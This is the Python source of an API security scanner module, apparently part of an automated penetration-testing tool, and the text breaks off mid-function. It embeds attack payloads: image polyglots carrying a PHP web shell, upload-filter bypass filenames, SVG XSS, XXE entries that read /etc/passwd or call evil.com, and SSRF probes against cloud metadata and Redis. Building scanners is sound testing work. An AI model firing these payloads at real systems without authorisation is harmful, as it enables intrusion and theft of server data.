"""
API Security Scanner - ENTERPRISE EDITION v2.0

Enterprise-grade API security testing including REST, GraphQL, and file upload
vulnerabilities with advanced bypass techniques.

Features:
- REST API vulnerability testing (IDOR, Mass Assignment, Rate Limiting)
- GraphQL security (Introspection, Depth, Complexity)
- File Upload Security (Magic Bytes, Polyglot, Extension Bypass)
- Content-Type Manipulation Attacks
- API Key & Secret Exposure Detection
- JWT in API Responses
- Server-Side Request Forgery (SSRF) Detection
- XML External Entity (XXE) Testing
- API Versioning Security
- Hidden Endpoint Discovery

CWE Coverage:
- CWE-200: Exposure of Sensitive Information
- CWE-312: Cleartext Storage of Sensitive Information  
- CWE-434: Unrestricted Upload of Dangerous File Type
- CWE-436: Interpretation Conflict (MIME confusion)
- CWE-639: IDOR/BOLA
- CWE-770: Resource Exhaustion (Rate Limiting)
- CWE-915: Mass Assignment
- CWE-918: Server-Side Request Forgery
- CWE-611: XML External Entity (XXE)

Author: PetNTester AI Enterprise
Version: 2.0.0-enterprise
"""

from __future__ import annotations

import json
import re
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import TYPE_CHECKING, Any, Optional
from urllib.parse import urljoin, urlparse, parse_qs

import httpx

from scanning.findings import Finding, Severity, VulnType
from scanning.vuln_scanner import ScanModule
from utils.scan_client import get_scan_client
from scanning.scan_context import ScanContext
from utils.endpoint_map import EndpointMap, EndpointCategory
from utils.logger import get_logger
from utils.rate_limiter import RateLimiter
from utils.exploitation_helper import ExploitationHelper

if TYPE_CHECKING:
    from core.config_manager import Settings
    from scanning.linux_tools_orchestrator import LinuxToolsOrchestrator

logger = get_logger(__name__)

# Flag to track if orchestrator is available
_ORCHESTRATOR_AVAILABLE = True
try:
    from scanning.linux_tools_orchestrator import LinuxToolsOrchestrator, ToolStatus
except ImportError:
    _ORCHESTRATOR_AVAILABLE = False
    logger.debug("LinuxToolsOrchestrator not available - arjun integration disabled")


# ============================================================================
# ENTERPRISE DATA STRUCTURES
# ============================================================================

class UploadVulnType(Enum):
    """File upload vulnerability types."""
    EXTENSION_BYPASS = auto()
    CONTENT_TYPE_BYPASS = auto()
    MAGIC_BYTES_BYPASS = auto()
    POLYGLOT_FILE = auto()
    NULL_BYTE_INJECTION = auto()
    DOUBLE_EXTENSION = auto()
    CASE_MANIPULATION = auto()
    UNICODE_BYPASS = auto()
    PATH_TRAVERSAL = auto()
    SVG_XSS = auto()
    XML_XXE = auto()
    ZIP_SLIP = auto()


@dataclass
class UploadTestResult:
    """Result of a file upload test."""
    test_type: UploadVulnType
    success: bool
    filename: str = ""
    content_type: str = ""
    response_code: int = 0
    uploaded_url: str = ""
    evidence: list[str] = field(default_factory=list)


@dataclass
class FileSignature:
    """File signature (magic bytes) definition."""
    extension: str
    mime_type: str
    magic_bytes: bytes
    description: str


# ============================================================================
# ENTERPRISE FILE SIGNATURES & PAYLOADS
# ============================================================================

# Magic bytes for common file types
FILE_SIGNATURES = {
    "gif": FileSignature("gif", "image/gif", b"GIF89a", "GIF Image"),
    "png": FileSignature("png", "image/png", b"\x89PNG\r\n\x1a\n", "PNG Image"),
    "jpg": FileSignature("jpg", "image/jpeg", b"\xff\xd8\xff\xe0", "JPEG Image"),
    "pdf": FileSignature("pdf", "application/pdf", b"%PDF-1.", "PDF Document"),
    "zip": FileSignature("zip", "application/zip", b"PK\x03\x04", "ZIP Archive"),
    "rar": FileSignature("rar", "application/x-rar", b"Rar!\x1a\x07", "RAR Archive"),
    "exe": FileSignature("exe", "application/x-executable", b"MZ", "Windows Executable"),
    "elf": FileSignature("elf", "application/x-executable", b"\x7fELF", "Linux Executable"),
    "mp3": FileSignature("mp3", "audio/mpeg", b"\xff\xfb", "MP3 Audio"),
    "mp4": FileSignature("mp4", "video/mp4", b"\x00\x00\x00\x18ftypmp4", "MP4 Video"),
}

# Dangerous file extensions to test
DANGEROUS_EXTENSIONS = [
    # Server-side execution
    ".php", ".php3", ".php4", ".php5", ".php7", ".phtml", ".phar",
    ".asp", ".aspx", ".asa", ".asax", ".ascx", ".ashx", ".asmx",
    ".jsp", ".jspx", ".jsf", ".jsw", ".jsv",
    ".cgi", ".pl", ".py", ".rb", ".sh", ".bash",
    # Web shells
    ".htaccess", ".htpasswd", ".config", ".ini",
    # Client-side execution
    ".html", ".htm", ".shtml", ".xhtml",
    ".svg", ".xml", ".xsl", ".xslt",
    ".swf", ".jar",
]

# Extension bypass techniques
EXTENSION_BYPASS_PAYLOADS = [
    # Double extensions
    "{name}.jpg.php", "{name}.png.php", "{name}.gif.php",
    "{name}.jpeg.asp", "{name}.pdf.aspx",
    # Null byte injection (legacy)
    "{name}.php%00.jpg", "{name}.php\x00.jpg",
    "{name}.asp%00.gif", "{name}.aspx%00.png",
    # Case manipulation
    "{name}.PhP", "{name}.pHp", "{name}.PHP",
    "{name}.AsP", "{name}.aSPx", "{name}.JSP",
    # Alternative extensions
    "{name}.php5", "{name}.php7", "{name}.phtml", "{name}.phar",
    "{name}.asa", "{name}.cer", "{name}.cdx",
    # Unicode/special chars
    "{name}.php;.jpg", "{name}.php:jpg", "{name}.php%20",
    "{name}%2ephp", "{name}.p%68p",
    # Trailing chars
    "{name}.php.", "{name}.php..", "{name}.php/",
    "{name}.php\\", "{name}.php ",
    # NTFS streams (Windows)
    "{name}.php::$DATA", "{name}.php::$data",
]

# Content-Type bypass payloads
CONTENT_TYPE_BYPASS = [
    # Valid image types with PHP content
    ("image/gif", "shell.php"),
    ("image/png", "shell.php"),
    ("image/jpeg", "shell.php"),
    # Mixed content types
    ("text/plain", "shell.php"),
    ("application/octet-stream", "shell.php"),
    # Double content-type
    ("image/gif, application/x-php", "shell.gif.php"),
    # Empty/invalid
    ("", "shell.php"),
    ("x-custom/type", "shell.php"),
]

# Polyglot file templates (valid image + PHP code)
POLYGLOT_TEMPLATES = {
    "gif_php": (
        b"GIF89a/*" + b"\x00" * 100 + b"*/<?php system($_GET['c']); ?>" + b"\x00" * 10
    ),
    "png_php": (
        b"\x89PNG\r\n\x1a\n" + 
        b"\x00\x00\x00\rIHDR" +
        b"\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00" +
        b"<?php system($_GET['c']); ?>"
    ),
    "jpg_php": (
        b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00" +
        b"<?php system($_GET['c']); ?>" +
        b"\xff\xd9"
    ),
}

# SVG XSS payloads
SVG_XSS_PAYLOADS = [
    '''<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
<script>alert('XSS')</script>
</svg>''',
    '''<svg onload="alert('XSS')" xmlns="http://www.w3.org/2000/svg"></svg>''',
    '''<svg xmlns="http://www.w3.org/2000/svg">
<foreignObject>
<body xmlns="http://www.w3.org/1999/xhtml">
<script>alert('XSS')</script>
</body>
</foreignObject>
</svg>''',
]

# XXE payloads for XML file uploads
XXE_PAYLOADS = [
    '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>''',
    '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>
<root>&xxe;</root>''',
    '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">
%xxe;
]>
<root>&exfil;</root>''',
]

# SSRF payloads for API testing
SSRF_PAYLOADS = [
    "http://127.0.0.1/", "http://localhost/",
    "http://[::1]/", "http://0.0.0.0/",
    "http://127.0.0.1:22/", "http://127.0.0.1:3306/",
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://metadata.google.internal/",  # GCP metadata
    "http://169.254.169.254/metadata/v1/",  # Azure metadata
    "file:///etc/passwd",
    "dict://127.0.0.1:6379/INFO",  # Redis
    "gopher://127.0.0.1:6379/_INFO",
]


# =============================================================================
# G-06 FIX: OpenAPI/Swagger Ingestion Support
# =============================================================================

@dataclass
class OpenAPIEndpoint:
    """Endpoint extracted from OpenAPI spec."""
    path: str
    method: str  # GET, POST, PUT, DELETE, PATCH
    parameters: list[dict[str, Any]] = field(default_factory=list)
    request_body: Optional[dict[str, Any]] = None
    security: list[dict[str, Any]] = field(default_factory=list)
    description: str = ""
    operation_id: str = ""
    tags: list[str] = field(default_factory=list)


@dataclass
class OpenAPISpec:
    """Parsed OpenAPI specification."""
    title: str = ""
    version: str = ""
    base_url: str = ""
    endpoints: list[OpenAPIEndpoint] = field(default_factory=list)
    security_schemes: dict[str, Any] = field(default_factory=dict)
    servers: list[str] = field(default_factory=list)


class OpenAPIParser:
    """
    G-06 FIX: Parse OpenAPI/Swagger specifications to extract endpoints.

    Supports OpenAPI 2.0 (Swagger) and OpenAPI 3.0+.
    """

    @staticmethod
    def parse(spec_content: str | dict) -> Optional[OpenAPISpec]:
        """Parse OpenAPI spec from JSON/dict content."""
        try:
            if isinstance(spec_content, str):
                spec = json.loads(spec_content)
            else:
                spec = spec_content

            result = OpenAPISpec()

            # Get title and version
            info = spec.get("info", {})
            result.title = info.get("title", "Unknown API")
            result.version = info.get("version", "")

            # Get servers/base URL
            if "servers" in spec:  # OpenAPI 3.0+
                result.servers = [s.get("url", "") for s in spec.get("servers", [])]
                if result.servers:
                    result.base_url = result.servers[0]
            elif "host" in spec:  # OpenAPI 2.0 (Swagger)
                scheme = spec.get("schemes", ["https"])[0]
                base_path = spec.get("basePath", "")
                result.base_url = f"{scheme}://{spec['host']}{base_path}"
                result.servers = [result.base_url]

            # Get security schemes
            if "components" in spec and "securitySchemes" in spec["components"]:
                result.security_schemes = spec["components"]["securitySchemes"]
            elif "securityDefinitions" in spec:  # Swagger 2.0
                result.security_schemes = spec["securityDefinitions"]

            # Parse paths/endpoints
            paths = spec.get("paths", {})
            for path, path_item in paths.items():
                for method in ["get", "post", "put", "delete", "patch", "options", "head"]:
                    if method not in path_item:
                        continue

                    operation = path_item[method]

                    # Extract parameters
                    parameters = []
                    for param in operation.get("parameters", []) + path_item.get("parameters", []):
                        parameters.append({
                            "name": param.get("name", ""),
                            "in": param.get("in", "query"),  # path, query, header, cookie
                            "required": param.get("required", False),
                            "type": param.get("schema", {}).get("type", param.get("type", "string")),
                        })

                    # Extract request body (OpenAPI 3.0+)
                    request_body = None
                    if "requestBody" in operation:
                        request_body = operation["requestBody"]
                    elif "consumes" in operation or "consumes" in spec:
                        # Swagger 2.0 style
                        body_params = [p for p in parameters if p.get("in") == "body"]
                        if body_params:
                            request_body = {"parameters": body_params}

                    # Extract security requirements
                    security = operation.get("security", spec.get("security", []))

                    endpoint = OpenAPIEndpoint(
                        path=path,
                        method=method.upper(),
                        parameters=parameters,
                        request_body=request_body,
                        security=security,
                        description=operation.get("summary", operation.get("description", "")),
                        operation_id=operation.get("operationId", ""),
                        tags=operation.get("tags", []),
                    )
                    result.endpoints.append(endpoint)

            logger.info(f"[OpenAPI] Parsed spec: {result.title} v{result.version} - {len(result.endpoints)} endpoints")
            return result

        except Exception as e:
            logger.debug(f"[OpenAPI] Failed to parse spec: {e}")
            return None

    @staticmethod
    def to_asset_data(spec: OpenAPISpec, base_url: str) -> dict[str, Any]:
        """Convert parsed OpenAPI spec to asset_data format for scanners."""
        endpoints = []
        forms = []
        params_discovered = {}

        for ep in spec.endpoints:
            # Build full URL
            path = ep.path
            # Replace path parameters with placeholders
            url = urljoin(base_url, path)
            endpoints.append(url)

            # Extract query/path parameters for each endpoint
            param_names = [p["name"] for p in ep.parameters if p["in"] in ("query", "path")]
            if param_names:
                params_discovered[url] = param_names

            # If endpoint has request body, add to forms
            if ep.request_body or ep.method in ("POST", "PUT", "PATCH"):
                body_params = [p for p in ep.parameters if p["in"] == "body"]
                forms.append({
                    "action": url,
                    "method": ep.method,
                    "inputs": [
                        {"name": p["name"], "type": "text", "required": p.get("required", False)}
                        for p in body_params
                    ] if body_params else [{"name": "data", "type": "text"}],
                })

        return {
            "endpoints": endpoints,
            "urls": endpoints,
            "forms": forms,
            "tool_discovered_params": params_discovered,
            "openapi_spec": {
                "title": spec.title,
                "version": spec.version,
                "servers": spec.servers,
                "security_schemes": list(spec.security_schemes.keys()),
                "endpoint_count": len(spec.endpoints),
            },
        }


class APIScanner(ScanModule):
    """
    API Security Scanner - ENTERPRISE EDITION v2.0
    
    Comprehensive API security testing including:
    - REST API vulnerabilities (IDOR, Mass Assignment, Rate Limiting)
    - GraphQL security (Introspection, Depth, Complexity)
    - File Upload Security (Magic Bytes, Polyglot, Extension Bypass)
    - Content-Type Manipulation Attacks
    - Server-Side Request Forgery (SSRF)
    - XML External Entity (XXE)
    - API Key & Secret Exposure
    - Hidden Endpoint Discovery
    
    CWE Coverage: CWE-200, CWE-312, CWE-434, CWE-436, CWE-639,
                  CWE-770, CWE-915, CWE-918, CWE-611
    """
    
    name = "api_scanner"
    version = "2.0-enterprise"
    
    # Common API paths (extended)
    API_PATHS = [
        "/api", "/api/v1", "/api/v2", "/api/v3",
        "/rest", "/graphql", "/graphiql", "/api/graphql",
        "/v1", "/v2", "/v3",
        "/.well-known/openapi.json", "/openapi.json",
        "/swagger.json", "/swagger/v1/swagger.json",
        "/api-docs", "/docs", "/redoc",
        "/api/health", "/health", "/status",
        "/api/debug", "/debug", "/internal",
    ]
    
    # File upload paths to test
    UPLOAD_PATHS = [
        "/upload", "/api/upload", "/api/v1/upload",
        "/file/upload", "/files/upload", "/api/files",
        "/media/upload", "/images/upload", "/img/upload",
        "/avatar/upload", "/profile/avatar", "/user/avatar",
        "/attachments", "/api/attachments",
        "/import", "/api/import", "/bulk/import",
        "/document/upload", "/docs/upload",
    ]
    
    # IDOR test paths (extended)
    # FIX 2026-02-16: Comprehensive BOLA/IDOR patterns for modern APIs (crAPI-style)
    IDOR_PATTERNS = [
        # User/Account resources
        "/users/{id}", "/user/{id}", "/api/users/{id}", "/api/v1/users/{id}",
        "/profile/{id}", "/profiles/{id}", "/api/profile/{id}",
        "/account/{id}", "/accounts/{id}", "/api/accounts/{id}",
        "/me", "/api/me", "/api/v1/me",  # Current user (test auth bypass)

        # Transactional resources
        "/orders/{id}", "/order/{id}", "/api/orders/{id}", "/api/v1/orders/{id}",
        "/invoices/{id}", "/invoice/{id}", "/api/invoices/{id}",
        "/payments/{id}", "/payment/{id}", "/api/payments/{id}",
        "/transactions/{id}", "/transaction/{id}", "/api/transactions/{id}",
        "/purchases/{id}", "/purchase/{id}",

        # Documents/Files
        "/documents/{id}", "/document/{id}", "/api/documents/{id}",
        "/files/{id}", "/file/{id}", "/api/files/{id}",
        "/attachments/{id}", "/attachment/{id}",
        "/reports/{id}", "/report/{id}", "/api/reports/{id}",
        "/exports/{id}", "/export/{id}",

        # Communication
        "/messages/{id}", "/message/{id}", "/api/messages/{id}",
        "/conversations/{id}", "/conversation/{id}",
        "/comments/{id}", "/comment/{id}", "/api/comments/{id}",
        "/notifications/{id}", "/notification/{id}",

        # crAPI-style patterns (automotive/IoT APIs)
        "/vehicles/{id}", "/vehicle/{id}", "/api/vehicles/{id}",
        "/api/v1/vehicle/{id}/location",  # Vehicle tracking
        "/api/v1/vehicle/{id}/owner",
        "/api/v1/mechanic/reports/{id}",  # Mechanic reports
        "/api/v1/mechanic/service/{id}",
        "/community/api/v2/posts/{id}",  # Social features
        "/community/api/v2/comments/{id}",
        "/shop/orders/{id}",  # E-commerce
        "/shop/products/{id}",
        "/shop/return/{id}",

        # Admin endpoints (BFLA testing)
        "/admin/users/{id}", "/admin/user/{id}",
        "/admin/orders/{id}", "/admin/order/{id}",
        "/api/admin/users/{id}", "/api/admin/config/{id}",
        "/internal/users/{id}", "/internal/config/{id}",
        "/management/users/{id}", "/management/settings/{id}",

        # Nested resources (common BOLA vectors)
        "/users/{id}/orders", "/users/{id}/payments",
        "/users/{id}/documents", "/users/{id}/profile",
        "/users/{id}/settings", "/users/{id}/notifications",
        "/accounts/{id}/transactions", "/accounts/{id}/statements",
        "/orders/{id}/items", "/orders/{id}/tracking",
        "/vehicles/{id}/service-history",

        # UUIDs and other ID formats (test with actual IDs found)
        "/api/v1/resource/{id}",  # Generic pattern
        "/api/v2/resource/{id}",
    ]

    # BFLA (Broken Function Level Authorization) patterns - admin/privileged endpoints
    BFLA_PATTERNS = [
        "/admin", "/admin/", "/api/admin",
        "/admin/users", "/admin/config", "/admin/settings",
        "/admin/dashboard", "/admin/reports", "/admin/audit",
        "/management", "/management/users", "/management/config",
        "/internal", "/internal/debug", "/internal/config",
        "/api/internal", "/api/debug", "/api/config",
        "/superuser", "/root", "/system",
        "/api/v1/admin", "/api/v2/admin",
        "/backoffice", "/operator", "/staff",
    ]
    
    # GraphQL introspection query
    GRAPHQL_INTROSPECTION = """
    query IntrospectionQuery {
      __schema {
        types {
          name
          fields {
            name
            type {
              name
            }
          }
        }
      }
    }
    """
    
    def __init__(
        self,
        settings: Settings,
        *,
        findings_store: Any = None,
        rate_limiter: Any = None,
    ) -> None:
        super().__init__(settings, findings_store=findings_store, rate_limiter=rate_limiter)
        self.timeout = settings.timeouts.request_timeout if hasattr(settings, 'timeouts') else 30.0
        self.upload_results: list[UploadTestResult] = []
        self.discovered_uploads: list[str] = []
        self._orchestrator: Optional["LinuxToolsOrchestrator"] = None
        self._use_external_tools = getattr(settings, 'use_linux_tools', True)
        self.discovered_parameters: dict[str, list[str]] = {}  # URL -> [params]
        # Configurable endpoint limit for parameter discovery (default 50)
        self.max_endpoints_per_test = getattr(settings, 'api_scanner_max_endpoints', 50)

    def _get_orchestrator(self) -> Optional["LinuxToolsOrchestrator"]:
        """Get or create the Linux tools orchestrator."""
        if not _ORCHESTRATOR_AVAILABLE or not self._use_external_tools:
            return None

        if self._orchestrator is None:
            try:
                self._orchestrator = LinuxToolsOrchestrator(self.settings)
            except Exception as e:
                logger.debug(f"Failed to initialize orchestrator: {e}")
                return None

        return self._orchestrator

    async def _run_arjun_parameter_discovery(
        self,
        endpoints: list[str],
    ) -> dict[str, list[str]]:
        """
        Run arjun for parameter discovery on API endpoints.

        Arjun discovers hidden GET/POST parameters that may be vulnerable
        to injection attacks. Returns dict mapping URL -> discovered params.
        """
        discovered: dict[str, list[str]] = {}
        orchestrator = self._get_orchestrator()

        if not orchestrator:
            logger.debug("[API] External tools not available, skipping arjun")
            return discovered

        if not orchestrator.is_tool_available("arjun"):
            logger.debug("[API] arjun not installed, skipping parameter discovery")
            return discovered

        # Limit endpoints to configurable max (default 50)
        endpoints_to_test = endpoints[:self.max_endpoints_per_test]
        logger.info(f"[API] Running arjun parameter discovery on {len(endpoints_to_test)}/{len(endpoints)} endpoints")

        for endpoint in endpoints_to_test:
            try:
                result = await orchestrator.run_single_tool("arjun", endpoint)
                if result.status == ToolStatus.SUCCESS:
                    for finding in result.findings:
                        params = finding.get("metadata", {}).get("parameters", [])
                        if params:
                            url = finding.get("matched_at", endpoint)
                            discovered[url] = params
                            logger.info(f"[API] arjun found {len(params)} params: {', '.join(params[:5])}")
            except Exception as e:
                logger.debug(f"[API] arjun error on {endpoint}: {e}")

        self.discovered_parameters = discovered
        return discovered

    async def _check_parameter_injection(
        self,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """
        Test discovered parameters for basic injection vulnerabilities.

        Uses arjun-discovered parameters to test for SQLi, XSS indicators.
        """
        findings = []

        if not self.discovered_parameters:
            return findings

        # Basic injection test payloads
        sqli_payloads = ["'", "\"", "1' OR '1'='1", "1 AND 1=1"]
        xss_payloads = ["<script>", "\"onmouseover=", "javascript:"]

        async with get_scan_client(timeout=self.timeout, verify_ssl=False, http2=True) as client:
            for url, params in self.discovered_parameters.items():
                for param in params[:5]:  # Limit params per endpoint
                    # Test SQLi
                    for payload in sqli_payloads:
                        await rate_limiter.acquire()
                        try:
                            test_url = f"{url}?{param}={payload}"
                            response = await client.get(test_url, timeout=10.0)
                            content = response.text.lower()

                            # Check for SQL error indicators
                            sql_errors = [
                                "sql syntax", "mysql", "postgresql", "sqlite",
                                "ora-", "db2", "syntax error", "unclosed quotation"
                            ]
                            if any(err in content for err in sql_errors):
                                findings.append({
                                    "type": "potential_sqli",
                                    "name": f"Potential SQLi in parameter: {param}",
                                    "severity": "HIGH",
                                    "matched_at": test_url,
                                    "description": f"Parameter '{param}' discovered by arjun shows SQL error with payload",
                                    "metadata": {
                                        "parameter": param,
                                        "payload": payload,
                                        "discovered_by": "arjun",
                                    },
                                    "confidence": 90,
                                })
                                break  # Found, move to next param

                        except Exception as e:
                            logger.debug(f"[API] SQLi test error for param {param}: {e}")

                    # Test XSS reflection
                    for payload in xss_payloads:
                        await rate_limiter.acquire()
                        try:
                            test_url = f"{url}?{param}={payload}"
                            response = await client.get(test_url, timeout=10.0)

                            if payload in response.text:
                                findings.append({
                                    "type": "potential_xss",
                                    "name": f"Potential XSS in parameter: {param}",
                                    "severity": "MEDIUM",
                                    "matched_at": test_url,
                                    "description": f"Parameter '{param}' discovered by arjun reflects input",
                                    "metadata": {
                                        "parameter": param,
                                        "payload": payload,
                                        "discovered_by": "arjun",
                                    },
                                    "confidence": 85,
                                })
                                break

                        except Exception as e:
                            logger.debug(f"[API] XSS test error for param {param}: {e}")

        return findings
    
    async def scan(
        self,
        host: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> dict[str, Any]:
        """
        Comprehensive API security scan - ENTERPRISE EDITION.
        
        Performs:
        1. API endpoint discovery
        2. OpenAPI/Swagger exposure check
        3. GraphQL security testing
        4. BOLA/IDOR testing
        5. Excessive data exposure check
        6. Rate limiting verification
        7. Mass assignment testing
        8. API key exposure detection
        9. File upload security testing (ENTERPRISE)
        10. SSRF vulnerability testing (ENTERPRISE)
        11. XXE vulnerability testing (ENTERPRISE)
        """
        findings: list[dict[str, Any]] = []

        base_url = f"https://{host}" if not host.startswith("http") else host

        # SCAN CONTEXT: Unified access to auth, response validation, training app awareness
        self._ctx = ScanContext(asset_data)
        self._ctx.log_context_status()
        self._auth_headers = self._ctx.auth_headers
        if self._ctx.has_auth:
            logger.info(f"[API] Using authenticated session ({self._ctx.auth_method})")

        # Get domain classification for API-specific testing strategies
        domain_class = asset_data.get("domain_classification")
        self._domain_type = "unknown"
        if domain_class:
            self._domain_type = getattr(domain_class, "primary", "unknown")
            if hasattr(self._domain_type, "value"):
                self._domain_type = self._domain_type.value
            logger.info(f"[API] Domain type: {self._domain_type}")

        logger.info(f"🔍 API Scanner ENTERPRISE starting for {base_url}")

        # OPTIMIZATION: Track findings count for early termination
        max_findings = 15  # Stop after finding 15 issues to prevent timeout
        high_count = 0

        def should_continue() -> bool:
            nonlocal high_count
            high_count = sum(1 for f in findings if f.get("severity") in ["HIGH", "CRITICAL"])
            if len(findings) >= max_findings:
                logger.info(f"[API] Reached {len(findings)} findings, limiting further tests")
                return False
            if high_count >= 5:
                logger.info(f"[API] Found {high_count} HIGH+ findings, limiting further tests")
                return False
            return True

        # ====================================================================
        # PHASE 1: Discovery (ALWAYS RUN - needed for other phases)
        # ====================================================================
        api_endpoints = await self._discover_api_endpoints(base_url, rate_limiter)

        # ====================================================================
        # PHASE 1.5: Parameter Discovery with Arjun (External Tool)
        # ====================================================================
        if api_endpoints and should_continue():
            discovered_params = await self._run_arjun_parameter_discovery(api_endpoints)
            if discovered_params:
                logger.info(f"[API] Arjun discovered params on {len(discovered_params)} endpoints")
                # Test discovered parameters for injection vulnerabilities
                param_findings = await self._check_parameter_injection(base_url, rate_limiter)
                findings.extend(param_findings)

        # ====================================================================
        # PHASE 2: Documentation Exposure (ALWAYS RUN - fast)
        # ====================================================================
        openapi_findings = await self._check_openapi_exposure(base_url, rate_limiter)
        findings.extend(openapi_findings)

        # ====================================================================
        # PHASE 3: GraphQL Security (SKIP IF ENOUGH FINDINGS)
        # ====================================================================
        if should_continue():
            graphql_findings = await self._check_graphql(base_url, rate_limiter)
            findings.extend(graphql_findings)

        # ====================================================================
        # PHASE 4: IDOR/BOLA (HIGH VALUE - always run)
        # ====================================================================
        # Combine discovered endpoints with any passed from asset_data
        all_endpoints = list(api_endpoints)
        if asset_data.get("endpoints"):
            all_endpoints.extend(asset_data["endpoints"])
        if asset_data.get("api_endpoints"):
            all_endpoints.extend(asset_data["api_endpoints"])
        # Deduplicate
        all_endpoints = list(set(all_endpoints))

        idor_findings = await self._check_idor(base_url, rate_limiter, all_endpoints)
        findings.extend(idor_findings)

        # ====================================================================
        # PHASE 5-8: Secondary Tests (SKIP IF ENOUGH FINDINGS)
        # ====================================================================
        if should_continue():
            # PHASE 5: Data Exposure
            data_exposure_findings = await self._check_data_exposure(
                base_url, api_endpoints, rate_limiter
            )
            findings.extend(data_exposure_findings)

        if should_continue():
            # PHASE 6: Rate Limiting
            rate_limit_findings = await self._check_rate_limiting(
                base_url, api_endpoints, rate_limiter
            )
            findings.extend(rate_limit_findings)

        if should_continue():
            # PHASE 7: Mass Assignment
            mass_assignment_findings = await self._check_mass_assignment(
                base_url, api_endpoints, rate_limiter
            )
            findings.extend(mass_assignment_findings)

        if should_continue():
            # PHASE 8: API Key Exposure
            api_key_findings = await self._check_api_key_exposure(
                base_url, asset_data, rate_limiter
            )
            findings.extend(api_key_findings)

        # ====================================================================
        # PHASE 9-11: ENTERPRISE Tests (SKIP IF ENOUGH FINDINGS)
        # ====================================================================
        if should_continue():
            # PHASE 9: FILE UPLOAD SECURITY (ENTERPRISE)
            upload_findings = await self._check_file_upload_security(
                base_url, asset_data, rate_limiter
            )
            findings.extend(upload_findings)

        if should_continue():
            # PHASE 10: SSRF TESTING (ENTERPRISE)
            ssrf_findings = await self._check_ssrf_vulnerabilities(
                base_url, asset_data, rate_limiter
            )
            findings.extend(ssrf_findings)

        if should_continue():
            # PHASE 11: XXE TESTING (ENTERPRISE)
            xxe_findings = await self._check_xxe_vulnerabilities(
                base_url, asset_data, rate_limiter
            )
            findings.extend(xxe_findings)
        
        logger.info(f"✅ API Scanner ENTERPRISE complete: {len(findings)} findings")
        
        return {
            "module": self.name,
            "version": self.version,
            "findings": findings,
            "upload_endpoints_tested": len(self.discovered_uploads),
        }
    
    async def _discover_api_endpoints(
        self,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[str]:
        """Discover API endpoints using EndpointMap (intelligent) + fallback to hardcoded."""
        endpoints = []

        # OPTIMIZATION: First check EndpointMap for pre-discovered endpoints
        endpoint_map = EndpointMap.get_instance()
        map_endpoints = endpoint_map.get_for_scanner("api_scanner")

        if map_endpoints:
            # Use discovered endpoints from SmartEndpointDiscovery
            for ep in map_endpoints:
                if ep.verified or ep.confidence >= 0.7:
                    url = urljoin(base_url, ep.path)
                    endpoints.append(url)
            logger.info(f"[APIScanner] Using {len(endpoints)} endpoints from EndpointMap")

        # If EndpointMap is empty, fall back to hardcoded paths (legacy behavior)
        if not endpoints:
            logger.info("[APIScanner] EndpointMap empty, falling back to hardcoded paths")
            async with get_scan_client(timeout=self.timeout, verify_ssl=False, http2=True) as client:
                for path in self.API_PATHS:
                    await rate_limiter.acquire()

                    url = urljoin(base_url, path)
                    try:
                        response = await client.get(url, timeout=10.0)

                        if response.status_code in [200, 401, 403]:
                            endpoints.append(url)
                            logger.info(f"Found API endpoint: {url}")

                            # Check content type
                            content_type = response.headers.get("content-type", "")
                            if "json" in content_type or "xml" in content_type:
                                endpoints.append(url)

                    except Exception as e:
                        logger.debug(f"Error checking {url}: {e}")

        return list(set(endpoints))
    
    async def _check_openapi_exposure(
        self,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[dict[str, Any]]:
        """Check for exposed OpenAPI/Swagger documentation."""
        findings = []

        openapi_paths = [
            "/swagger.json",
            "/openapi.json",
            "/api-docs",
            "/swagger/v1/swagger.json",
            "/swagger-ui.html",
            "/swagger-ui/",
            "/api/swagger.json",
            "/docs",
            "/redoc",
            "/.well-known/openapi.json",
            # G-06 FIX: Additional OpenAPI paths
            "/api/openapi.json",
            "/api/v1/openapi.json",
            "/api/v2/openapi.json",
            "/v1/swagger.json",
            "/v2/swagger.json",
            "/openapi/v3/api-docs",  # Spring Boot
            "/v3/api-docs",
        ]

        async with get_scan_client(timeout=self.timeout, verify_ssl=False, http2=True) as client:
            for path in openapi_paths:
                await rate_limiter.acquire()

                url = urljoin(base_url, path)
                try:
                    response = await client.get(url, timeout=10.0)

                    if response.status_code == 200:
                        content = response.text

                        # Check if it's OpenAPI/Swagger JSON
                        is_openapi_json = any([
                            '"swagger"' in content.lower(),
                            '"openapi"' in content.lower(),
                        ])

                        # Check if it's Swagger UI HTML
                        is_swagger_ui = any([
                            "swagger-ui" in content.lower(),
                            "api documentation" in content.lower(),
                        ])

                        if is_openapi_json or is_swagger_ui:
                            # Determine severity based on content
                            severity = "MEDIUM"
                            description = "OpenAPI/Swagger documentation is publicly accessible."

                            # Check for sensitive info
                            sensitive_patterns = [
                                r'"password"',
                                r'"secret"',
                                r'"token"',
                                r'"api_key"',
                                r'/admin',
                                r'/internal',
                            ]

                            found_sensitive = []
                            for pattern in sensitive_patterns:
                                if re.search(pattern, content, re.IGNORECASE):
                                    found_sensitive.append(pattern)

                            if found_sensitive:
                                severity = "HIGH"
                                description += " Contains sensitive endpoint information."

                            # G-06 FIX: Parse the spec and store for other scanners
                            parsed_spec = None
                            extracted_endpoints = 0
                            if is_openapi_json:
                                parsed_spec = OpenAPIParser.parse(content)
                                if parsed_spec:
                                    extracted_endpoints = len(parsed_spec.endpoints)
                                    # Store for later use
                                    self._parsed_openapi_spec = parsed_spec
                                    logger.info(f"[API] Extracted {extracted_endpoints} endpoints from OpenAPI spec")

                            evidence = [
                                f"Documentation URL: {url}",
                                f"Sensitive patterns found: {found_sensitive}" if found_sensitive else "No sensitive patterns detected",
                            ]
                            if extracted_endpoints > 0:
